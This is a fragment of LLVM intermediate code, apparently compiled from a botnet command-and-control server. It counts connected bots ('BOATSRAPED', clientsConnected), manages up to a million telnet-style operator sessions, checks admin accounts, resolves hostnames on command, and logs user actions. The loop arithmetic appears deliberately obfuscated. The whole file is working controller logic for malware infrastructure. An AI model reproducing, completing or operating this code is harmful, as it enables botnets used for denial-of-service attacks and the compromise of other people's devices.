  %271 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %270
  %272 = getelementptr inbounds %struct.name, %struct.name* %271, i32 0, i32 0
  %273 = getelementptr inbounds [512 x i8], [512 x i8]* %272, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %273, i8 0, i64 512, i32 4, i1 false)
  br label %274

; <label>:274:                                    ; preds = %268, %261
  %275 = load i32, i32* %25, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %276
  %278 = getelementptr inbounds %struct.name, %struct.name* %277, i32 0, i32 0
  %279 = getelementptr inbounds [512 x i8], [512 x i8]* %278, i32 0, i32 0
  %280 = call i64 @strlen(i8* %279) #8
  %281 = icmp uge i64 %280, 1
  br i1 %281, label %282, label %304

; <label>:282:                                    ; preds = %274
  %283 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %284 = load i32, i32* %25, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %285
  %287 = getelementptr inbounds %struct.name, %struct.name* %286, i32 0, i32 0
  %288 = getelementptr inbounds [512 x i8], [512 x i8]* %287, i32 0, i32 0
  %289 = load i32, i32* %25, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %290
  %292 = getelementptr inbounds %struct.name, %struct.name* %291, i32 0, i32 1
  %293 = load i32, i32* %292, align 4
  %294 = call i32 (i8*, i8*, ...) @sprintf(i8* %283, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i32 0, i32 0), i8* %288, i32 %293) #7
  %295 = load i32, i32* %4, align 4
  %296 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %297 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  %298 = call i64 @strlen(i8* %297) #8
  %299 = call i64 @send(i32 %295, i8* %296, i64 %298, i32 16384)
  %300 = icmp eq i64 %299, -1
  br i1 %300, label %301, label %302

; <label>:301:                                    ; preds = %282
  br label %985

; <label>:302:                                    ; preds = %282
  %303 = getelementptr inbounds [512 x i8], [512 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %303, i8 0, i64 512, i32 16, i1 false)
  br label %304

; <label>:304:                                    ; preds = %302, %274
  br label %305

; <label>:305:                                    ; preds = %304
  %306 = load i32, i32* %25, align 4
  %307 = sub i32 %306, -1848100210
  %308 = add i32 %307, 1
  %309 = add i32 %308, -1848100210
  %310 = add nsw i32 %306, 1
  store i32 %309, i32* %25, align 4
  br label %258

; <label>:311:                                    ; preds = %258
  %312 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %313 = call i32 @clientsConnected()
  %314 = call i32 (i8*, i8*, ...) @sprintf(i8* %312, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i32 0, i32 0), i32 %313) #7
  %315 = load i32, i32* %4, align 4
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %317 = getelementptr inbounds [512 x i8], [512 x i8]* %28, i32 0, i32 0
  %318 = call i64 @strlen(i8* %317) #8
  %319 = call i64 @send(i32 %315, i8* %316, i64 %318, i32 16384)
  %320 = icmp eq i64 %319, -1
  br i1 %320, label %321, label %322

; <label>:321:                                    ; preds = %311
  br label %985

; <label>:322:                                    ; preds = %311
  br label %323

; <label>:323:                                    ; preds = %322, %252
  %324 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %325 = call i8* @strstr(i8* %324, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i32 0, i32 0)) #8
  %326 = icmp ne i8* %325, null
  br i1 %326, label %327, label %339

; <label>:327:                                    ; preds = %323
  %328 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %329 = load volatile i32, i32* @BOATSRAPED, align 4
  %330 = call i32 (i8*, i8*, ...) @sprintf(i8* %328, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i32 0, i32 0), i32 %329) #7
  %331 = load i32, i32* %4, align 4
  %332 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %333 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %334 = call i64 @strlen(i8* %333) #8
  %335 = call i64 @send(i32 %331, i8* %332, i64 %334, i32 16384)
  %336 = icmp eq i64 %335, -1
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %327
  br label %338

; <label>:338:                                    ; preds = %337, %327
  br label %339

; <label>:339:                                    ; preds = %338, %323
  %340 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %341 = call i8* @strstr(i8* %340, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0)) #8
  %342 = icmp ne i8* %341, null
  br i1 %342, label %343, label %365

; <label>:343:                                    ; preds = %339
  %344 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %345 = call i8* @strtok(i8* %344, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0)) #7
  store i8* %345, i8** %30, align 8
  %346 = load i8*, i8** %30, align 8
  %347 = getelementptr inbounds i8, i8* %346, i64 8
  store i8* %347, i8** %31, align 8
  %348 = load i8*, i8** %31, align 8
  call void @trim(i8* %348)
  %349 = load i8*, i8** %31, align 8
  %350 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %351 = bitcast i8** %350 to i8*
  %352 = call i32 @hostname_to_ip(i8* %349, i8* %351)
  %353 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %354 = load i8*, i8** %31, align 8
  %355 = getelementptr inbounds [100 x i8*], [100 x i8*]* %29, i32 0, i32 0
  %356 = call i32 (i8*, i8*, ...) @sprintf(i8* %353, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i32 0, i32 0), i8* %354, i8** %355) #7
  %357 = load i32, i32* %4, align 4
  %358 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %360 = call i64 @strlen(i8* %359) #8
  %361 = call i64 @send(i32 %357, i8* %358, i64 %360, i32 16384)
  %362 = icmp eq i64 %361, -1
  br i1 %362, label %363, label %364

; <label>:363:                                    ; preds = %343
  br label %364

; <label>:364:                                    ; preds = %363, %343
  br label %365

; <label>:365:                                    ; preds = %364, %339
  %366 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %367 = call i8* @strstr(i8* %366, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i32 0, i32 0)) #8
  %368 = icmp ne i8* %367, null
  br i1 %368, label %369, label %400

; <label>:369:                                    ; preds = %365
  %370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %371 = call i32 (i8*, i8*, ...) @sprintf(i8* %370, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i32 0, i32 0)) #7
  %372 = load i32, i32* %4, align 4
  %373 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %374 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %375 = call i64 @strlen(i8* %374) #8
  %376 = call i64 @send(i32 %372, i8* %373, i64 %375, i32 16384)
  %377 = icmp eq i64 %376, -1
  br i1 %377, label %378, label %379

; <label>:378:                                    ; preds = %369
  br label %379

; <label>:379:                                    ; preds = %378, %369
  %380 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %381 = call i32 (i8*, i8*, ...) @sprintf(i8* %380, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i32 0, i32 0)) #7
  %382 = load i32, i32* %4, align 4
  %383 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %384 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %385 = call i64 @strlen(i8* %384) #8
  %386 = call i64 @send(i32 %382, i8* %383, i64 %385, i32 16384)
  %387 = icmp eq i64 %386, -1
  br i1 %387, label %388, label %389

; <label>:388:                                    ; preds = %379
  br label %389

; <label>:389:                                    ; preds = %388, %379
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %390, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i32 0, i32 0)) #7
  %392 = load i32, i32* %4, align 4
  %393 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %394 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %395 = call i64 @strlen(i8* %394) #8
  %396 = call i64 @send(i32 %392, i8* %393, i64 %395, i32 16384)
  %397 = icmp eq i64 %396, -1
  br i1 %397, label %398, label %399

; <label>:398:                                    ; preds = %389
  br label %399

; <label>:399:                                    ; preds = %398, %389
  br label %400

; <label>:400:                                    ; preds = %399, %365
  %401 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %402 = call i8* @strstr(i8* %401, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0)) #8
  %403 = icmp ne i8* %402, null
  br i1 %403, label %404, label %435

; <label>:404:                                    ; preds = %400
  %405 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %406 = call i32 (i8*, i8*, ...) @sprintf(i8* %405, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i32 0, i32 0)) #7
  %407 = load i32, i32* %4, align 4
  %408 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %409 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %410 = call i64 @strlen(i8* %409) #8
  %411 = call i64 @send(i32 %407, i8* %408, i64 %410, i32 16384)
  %412 = icmp eq i64 %411, -1
  br i1 %412, label %413, label %414

; <label>:413:                                    ; preds = %404
  br label %414

; <label>:414:                                    ; preds = %413, %404
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %416 = call i32 (i8*, i8*, ...) @sprintf(i8* %415, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i32 0, i32 0)) #7
  %417 = load i32, i32* %4, align 4
  %418 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %419 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %420 = call i64 @strlen(i8* %419) #8
  %421 = call i64 @send(i32 %417, i8* %418, i64 %420, i32 16384)
  %422 = icmp eq i64 %421, -1
  br i1 %422, label %423, label %424

; <label>:423:                                    ; preds = %414
  br label %424

; <label>:424:                                    ; preds = %423, %414
  %425 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %426 = call i32 (i8*, i8*, ...) @sprintf(i8* %425, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i32 0, i32 0)) #7
  %427 = load i32, i32* %4, align 4
  %428 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %429 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %430 = call i64 @strlen(i8* %429) #8
  %431 = call i64 @send(i32 %427, i8* %428, i64 %430, i32 16384)
  %432 = icmp eq i64 %431, -1
  br i1 %432, label %433, label %434

; <label>:433:                                    ; preds = %424
  br label %434

; <label>:434:                                    ; preds = %433, %424
  br label %435

; <label>:435:                                    ; preds = %434, %400
  %436 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %437 = call i8* @strstr(i8* %436, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i32 0, i32 0)) #8
  %438 = icmp ne i8* %437, null
  br i1 %438, label %439, label %520

; <label>:439:                                    ; preds = %435
  %440 = load i8*, i8** %12, align 8
  %441 = load i32, i32* %5, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %442
  %444 = getelementptr inbounds %struct.account, %struct.account* %443, i32 0, i32 2
  %445 = getelementptr inbounds [200 x i8], [200 x i8]* %444, i32 0, i32 0
  %446 = call i32 @strcmp(i8* %440, i8* %445) #8
  %447 = icmp eq i32 %446, 0
  br i1 %447, label %457, label %448

; <label>:448:                                    ; preds = %439
  %449 = load i8*, i8** %13, align 8
  %450 = load i32, i32* %5, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %451
  %453 = getelementptr inbounds %struct.account, %struct.account* %452, i32 0, i32 2
  %454 = getelementptr inbounds [200 x i8], [200 x i8]* %453, i32 0, i32 0
  %455 = call i32 @strcmp(i8* %449, i8* %454) #8
  %456 = icmp eq i32 %455, 0
  br i1 %456, label %457, label %508

; <label>:457:                                    ; preds = %448, %439
  %458 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %459 = call i32 (i8*, i8*, ...) @sprintf(i8* %458, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i32 0, i32 0)) #7
  %460 = load i32, i32* %4, align 4
  %461 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %462 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %463 = call i64 @strlen(i8* %462) #8
  %464 = call i64 @send(i32 %460, i8* %461, i64 %463, i32 16384)
  %465 = icmp eq i64 %464, -1
  br i1 %465, label %466, label %467

; <label>:466:                                    ; preds = %457
  br label %467

; <label>:467:                                    ; preds = %466, %457
  %468 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %469 = call i32 (i8*, i8*, ...) @sprintf(i8* %468, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i32 0, i32 0)) #7
  %470 = load i32, i32* %4, align 4
  %471 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %472 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %473 = call i64 @strlen(i8* %472) #8
  %474 = call i64 @send(i32 %470, i8* %471, i64 %473, i32 16384)
  %475 = icmp eq i64 %474, -1
  br i1 %475, label %476, label %477

; <label>:476:                                    ; preds = %467
  br label %477

; <label>:477:                                    ; preds = %476, %467
  %478 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %479 = call i32 (i8*, i8*, ...) @sprintf(i8* %478, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i32 0, i32 0)) #7
  %480 = load i32, i32* %4, align 4
  %481 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %482 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %483 = call i64 @strlen(i8* %482) #8
  %484 = call i64 @send(i32 %480, i8* %481, i64 %483, i32 16384)
  %485 = icmp eq i64 %484, -1
  br i1 %485, label %486, label %487

; <label>:486:                                    ; preds = %477
  br label %487

; <label>:487:                                    ; preds = %486, %477
  %488 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %489 = call i32 (i8*, i8*, ...) @sprintf(i8* %488, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i32 0, i32 0)) #7
  %490 = load i32, i32* %4, align 4
  %491 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %492 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %493 = call i64 @strlen(i8* %492) #8
  %494 = call i64 @send(i32 %490, i8* %491, i64 %493, i32 16384)
  %495 = icmp eq i64 %494, -1
  br i1 %495, label %496, label %497

; <label>:496:                                    ; preds = %487
  br label %497

; <label>:497:                                    ; preds = %496, %487
  %498 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %499 = call i32 (i8*, i8*, ...) @sprintf(i8* %498, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i32 0, i32 0)) #7
  %500 = load i32, i32* %4, align 4
  %501 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %502 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %503 = call i64 @strlen(i8* %502) #8
  %504 = call i64 @send(i32 %500, i8* %501, i64 %503, i32 16384)
  %505 = icmp eq i64 %504, -1
  br i1 %505, label %506, label %507

; <label>:506:                                    ; preds = %497
  br label %507

; <label>:507:                                    ; preds = %506, %497
  br label %519

; <label>:508:                                    ; preds = %448
  %509 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %510 = call i32 (i8*, i8*, ...) @sprintf(i8* %509, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %511 = load i32, i32* %4, align 4
  %512 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %513 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %514 = call i64 @strlen(i8* %513) #8
  %515 = call i64 @send(i32 %511, i8* %512, i64 %514, i32 16384)
  %516 = icmp eq i64 %515, -1
  br i1 %516, label %517, label %518

; <label>:517:                                    ; preds = %508
  br label %518

; <label>:518:                                    ; preds = %517, %508
  br label %519

; <label>:519:                                    ; preds = %518, %507
  br label %520

; <label>:520:                                    ; preds = %519, %435
  %521 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %522 = call i8* @strstr(i8* %521, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #8
  %523 = icmp ne i8* %522, null
  br i1 %523, label %524, label %545

; <label>:524:                                    ; preds = %520
  %525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %526 = call i32 (i8*, i8*, ...) @sprintf(i8* %525, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i32 0, i32 0)) #7
  %527 = load i32, i32* %4, align 4
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %530 = call i64 @strlen(i8* %529) #8
  %531 = call i64 @send(i32 %527, i8* %528, i64 %530, i32 16384)
  %532 = icmp eq i64 %531, -1
  br i1 %532, label %533, label %534

; <label>:533:                                    ; preds = %524
  br label %534

; <label>:534:                                    ; preds = %533, %524
  %535 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %536 = call i32 (i8*, i8*, ...) @sprintf(i8* %535, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i32 0, i32 0)) #7
  %537 = load i32, i32* %4, align 4
  %538 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %539 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %540 = call i64 @strlen(i8* %539) #8
  %541 = call i64 @send(i32 %537, i8* %538, i64 %540, i32 16384)
  %542 = icmp eq i64 %541, -1
  br i1 %542, label %543, label %544

; <label>:543:                                    ; preds = %534
  br label %544

; <label>:544:                                    ; preds = %543, %534
  br label %545

; <label>:545:                                    ; preds = %544, %520
  %546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %547 = call i8* @strstr(i8* %546, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #8
  %548 = icmp ne i8* %547, null
  br i1 %548, label %553, label %549

; <label>:549:                                    ; preds = %545
  %550 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %551 = call i8* @strstr(i8* %550, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0)) #8
  %552 = icmp ne i8* %551, null
  br i1 %552, label %553, label %585

; <label>:553:                                    ; preds = %549, %545
  %554 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %555 = call i32 (i8*, i8*, ...) @sprintf(i8* %554, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #7
  %556 = load i32, i32* %4, align 4
  %557 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %558 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %559 = call i64 @strlen(i8* %558) #8
  %560 = call i64 @send(i32 %556, i8* %557, i64 %559, i32 16384)
  %561 = icmp eq i64 %560, -1
  br i1 %561, label %562, label %563

; <label>:562:                                    ; preds = %553
  br label %563

; <label>:563:                                    ; preds = %562, %553
  %564 = load i32, i32* %4, align 4
  %565 = call i64 @send(i32 %564, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i32 0, i32 0), i64 17, i32 16384)
  %566 = icmp eq i64 %565, -1
  br i1 %566, label %567, label %568

; <label>:567:                                    ; preds = %563
  br label %985

; <label>:568:                                    ; preds = %563
  %569 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %569, %struct._IO_FILE** %32, align 8
  %570 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %571 = load i32, i32* %5, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %572
  %574 = getelementptr inbounds %struct.account, %struct.account* %573, i32 0, i32 0
  %575 = getelementptr inbounds [200 x i8], [200 x i8]* %574, i32 0, i32 0
  %576 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %570, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %575)
  %577 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %578 = call i32 @fclose(%struct._IO_FILE* %577)
  %579 = load i32, i32* %5, align 4
  %580 = sext i32 %579 to i64
  %581 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %580
  %582 = getelementptr inbounds %struct.account, %struct.account* %581, i32 0, i32 0
  %583 = getelementptr inbounds [200 x i8], [200 x i8]* %582, i32 0, i32 0
  %584 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %583)
  br label %585

; <label>:585:                                    ; preds = %568, %549
  %586 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %587 = call i8* @strstr(i8* %586, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #8
  %588 = icmp ne i8* %587, null
  br i1 %588, label %589, label %606

; <label>:589:                                    ; preds = %585
  %590 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %590, %struct._IO_FILE** %33, align 8
  %591 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %592 = load i32, i32* %5, align 4
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %593
  %595 = getelementptr inbounds %struct.account, %struct.account* %594, i32 0, i32 0
  %596 = getelementptr inbounds [200 x i8], [200 x i8]* %595, i32 0, i32 0
  %597 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %591, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %596)
  %598 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %599 = call i32 @fclose(%struct._IO_FILE* %598)
  %600 = load i32, i32* %5, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %601
  %603 = getelementptr inbounds %struct.account, %struct.account* %602, i32 0, i32 0
  %604 = getelementptr inbounds [200 x i8], [200 x i8]* %603, i32 0, i32 0
  %605 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %604)
  br label %606

; <label>:606:                                    ; preds = %589, %585
  %607 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %608 = call i8* @strstr(i8* %607, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0)) #8
  %609 = icmp ne i8* %608, null
  br i1 %609, label %610, label %616

; <label>:610:                                    ; preds = %606
  %611 = load i32, i32* %4, align 4
  %612 = call i64 @send(i32 %611, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 16, i32 16384)
  %613 = icmp eq i64 %612, -1
  br i1 %613, label %614, label %615

; <label>:614:                                    ; preds = %610
  br label %985

; <label>:615:                                    ; preds = %610
  br label %616

; <label>:616:                                    ; preds = %615, %606
  %617 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %618 = call i8* @strstr(i8* %617, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0)) #8
  %619 = icmp ne i8* %618, null
  br i1 %619, label %620, label %704

; <label>:620:                                    ; preds = %616
  %621 = load i8*, i8** %12, align 8
  %622 = load i32, i32* %5, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %623
  %625 = getelementptr inbounds %struct.account, %struct.account* %624, i32 0, i32 2
  %626 = getelementptr inbounds [200 x i8], [200 x i8]* %625, i32 0, i32 0
  %627 = call i32 @strcmp(i8* %621, i8* %626) #8
  %628 = icmp eq i32 %627, 0
  br i1 %628, label %638, label %629

; <label>:629:                                    ; preds = %620
  %630 = load i8*, i8** %13, align 8
  %631 = load i32, i32* %5, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %632
  %634 = getelementptr inbounds %struct.account, %struct.account* %633, i32 0, i32 2
  %635 = getelementptr inbounds [200 x i8], [200 x i8]* %634, i32 0, i32 0
  %636 = call i32 @strcmp(i8* %630, i8* %635) #8
  %637 = icmp eq i32 %636, 0
  br i1 %637, label %638, label %692

; <label>:638:                                    ; preds = %629, %620
  %639 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %640 = call i8* @strcpy(i8* %639, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i32 0, i32 0)) #7
  %641 = load i32, i32* %4, align 4
  %642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %643 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %644 = call i64 @strlen(i8* %643) #8
  %645 = call i64 @send(i32 %641, i8* %642, i64 %644, i32 16384)
  %646 = icmp eq i64 %645, -1
  br i1 %646, label %647, label %648

; <label>:647:                                    ; preds = %638
  store i8* null, i8** %2, align 8
  br label %998

; <label>:648:                                    ; preds = %638
  store i32 0, i32* %34, align 4
  br label %649

; <label>:649:                                    ; preds = %685, %648
  %650 = load i32, i32* %34, align 4
  %651 = icmp slt i32 %650, 1000000
  br i1 %651, label %652, label %691

; <label>:652:                                    ; preds = %649
  %653 = load i32, i32* %34, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %654
  %656 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %655, i32 0, i32 2
  %657 = getelementptr inbounds [20 x i8], [20 x i8]* %656, i32 0, i32 0
  %658 = call i64 @strlen(i8* %657) #8
  %659 = icmp ugt i64 %658, 1
  br i1 %659, label %660, label %684

; <label>:660:                                    ; preds = %652
  %661 = load i32, i32* %34, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %662
  %664 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %663, i32 0, i32 1
  %665 = load i32, i32* %664, align 4
  %666 = icmp eq i32 %665, 1
  br i1 %666, label %667, label %684

; <label>:667:                                    ; preds = %660
  %668 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %669 = load i32, i32* %34, align 4
  %670 = load i32, i32* %34, align 4
  %671 = sext i32 %670 to i64
  %672 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %671
  %673 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %672, i32 0, i32 2
  %674 = getelementptr inbounds [20 x i8], [20 x i8]* %673, i32 0, i32 0
  %675 = call i32 (i8*, i8*, ...) @sprintf(i8* %668, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i32 0, i32 0), i32 %669, i8* %674) #7
  %676 = load i32, i32* %4, align 4
